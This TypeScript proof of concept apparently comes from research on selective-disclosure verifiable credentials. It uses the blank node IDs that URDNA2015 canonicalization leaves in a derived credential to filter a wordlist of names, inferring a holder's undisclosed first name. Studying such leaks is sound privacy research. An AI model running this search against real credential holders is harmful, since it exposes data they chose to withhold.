/*Example 1*/

const PATH_RDF_lib = '../../URDNA2015lib';
const URDNAalg = require(PATH_RDF_lib+'/URDNA2015');
const NQuads = require(PATH_RDF_lib+'/NQuads');
var fs = require('fs');
const jsonld = require('jsonld');
const crypto = require('crypto');

import Credential from "./data/DerivedCredential.json";

const hashAlgorithm = 'sha256';

// Load the names to check
const NamesFile = fs.readFileSync('./src/data//names.txt', 'utf8', function(err: any, data: any) {
  if (err) throw err;
  console.log('OK');
});

const names = NamesFile.split('\n');
console.log("Loaded "+names.length + " names...");

// Load and parse Crendential file
const VCfile = fs.readFileSync("./src/data/DerivedCredential.json");
const VCdata = JSON.parse(VCfile);

console.log("------------------------------------------------------------------------");
console.log(JSON.stringify(VCdata, null, 2));
console.log("------------------------------------------------------------------------");

// Load the hypothized core of the VC
const HypothesizeddVCfile = fs.readFileSync("./src/data/HypothesizedCredential.json");
const HypothesizedVCdata = JSON.parse(HypothesizeddVCfile);


// Replase the disclosed values in the hypothesized VC
const keys = Object.keys(VCdata);
if(keys.includes("address")){
	HypothesizedVCdata["address"]["postalAddress"] = VCdata["address"]["postalAddress"];
}
else if(keys.includes("firstName")){
	HypothesizedVCdata["firstName"] = VCdata["firstName"];
}
else{
	console.log("No values have been disclosed");
};


// Canonize a VC using URDNA2015 to get the quads used by that algorithm,
// which will become the referense set of each blank node later
// (using a slitely reformed version of URDNA2015 to return those quads)
async function doCanonize(VC: any){

  const VCtoRDF = await jsonld.toRDF(VC, {produceGeneralizedRdf: false});
  console.log("Done Converting to RDF");

  const canonize = new URDNAalg();

  const CanonizedResults = await canonize.main(VCtoRDF);
  const QuadsLists = CanonizedResults[1]

  console.log("Done Canonization");
  console.log("Quads Used: ");
  console.log(QuadsLists);
  return QuadsLists
};


// Return the hash of a referense set of a quad node after replaising
// all the empty ("_") values with hypothesized ones 
// (e.g. after hypothizing that the Holders name is "Jane")
function getBlankNodeHash(VARIABLE: any, BlankNode_Quads: any){
	const md = crypto.createHash(hashAlgorithm);
	var quads = []
	for(const quad of BlankNode_Quads){
		const indx = quad.search('\"_\"')
		if(indx != -1){
			var new_quad = quad.split('\"_\"');
			quads.push(new_quad[0]+'\"' + `${VARIABLE}` + '\"'+ new_quad[1]);
		} else{quads.push(quad)};
	}

	quads.sort();

	for(const quad of quads){
		md.update(quad);
	};

	return  md.digest('hex')
};


// Search every name
async function searchNames(VCdata: any, HypothesizedVCdata: any, names: any){
	const results = [];

	const QuadsLists = await doCanonize(HypothesizedVCdata);  // reference sets Qi
	
	const Second_BlankNode_ID = VCdata["address"]["id"];

	// Depending on the id fields search for a name for which
	// h(Q1) > h(Q2) or h(Q1) < h(Q2).
	// (chacks alphabetically but that will do for now.
	// TO_DO: fix that)
	console.log("------------------------------------------------------------------------");
	if(Second_BlankNode_ID == "urn:bnid:_:c14n1"){ 
		console.log("Searching for h(Q1) < h(Q2)...");
		for(const name of names){
			const FirstBlankNode_Quads = QuadsLists[0];  // First reference set Q1
			const SecondBlankNode_Quads = QuadsLists[1]; // Second reference set Q2

			// Hash of the reference sets elements
			const FirstBlankNode_hash = getBlankNodeHash(name, FirstBlankNode_Quads);
			const SecondBlankNode_hash = getBlankNodeHash("", SecondBlankNode_Quads);
      
      // chsck if the inequality h(Q1) < h(Q2), which results
      // in the id "urn:bnid:_:c14n1", holds
			if(FirstBlankNode_hash<SecondBlankNode_hash){
				//console.log(name);
				results.push(name);
			}
		}
	}
	else if(Second_BlankNode_ID == "urn:bnid:_:c14n0"){
		console.log("Searching for h(Q1) > h(Q2)...")
		for(const name of names){
			const FirstBlankNode_Quads = QuadsLists[0]; // First reference set Q1
			const SecondBlankNode_Quads = QuadsLists[1]; // Second reference set Q2

			// Hash of the reference sets elements
			const FirstBlankNode_hash = getBlankNodeHash(name, FirstBlankNode_Quads);
			const SecondBlankNode_hash = getBlankNodeHash("", SecondBlankNode_Quads);

			// chsck if the inequality h(Q1) > h(Q2), which results
      // in the id "urn:bnid:_:c14n0", holds
			if(FirstBlankNode_hash>SecondBlankNode_hash){
				//console.log(name);
				results.push(name);
			}
		}
	}
	else{throw "ERR: Unrecognized ID field"};

	console.log("Search Done. \nNames Found: " + results.length);
	console.log("============================== Results =================================");
	console.log(results)
};

searchNames(VCdata, HypothesizedVCdata, names)


